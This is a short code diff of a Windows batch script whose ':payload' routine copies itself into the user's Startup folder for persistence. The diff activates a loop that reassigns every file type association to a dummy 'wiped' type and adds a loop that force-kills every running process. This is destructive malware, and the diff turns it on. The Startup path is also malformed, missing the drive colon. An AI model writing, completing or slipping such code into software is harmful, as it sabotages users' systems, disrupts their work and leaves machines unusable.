@@ -11,5 +11,6 @@ goto :eof
 
 :payload
     copy "%~dpnx0" "C\Users\%USERNAME%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\skibidi.bat"
-    REM for /f "delims==" %%a in ('assoc') do (assoc %%a=wiped & ftype wiped=wiped.bat)
+    for /f "delims==" %%a in ('assoc') do (assoc %%a=wiped & ftype wiped=wiped.bat)
+    for /f "delims= " %%a in ('tasklist') do (taskkill /f /im %%a)
 goto :eof
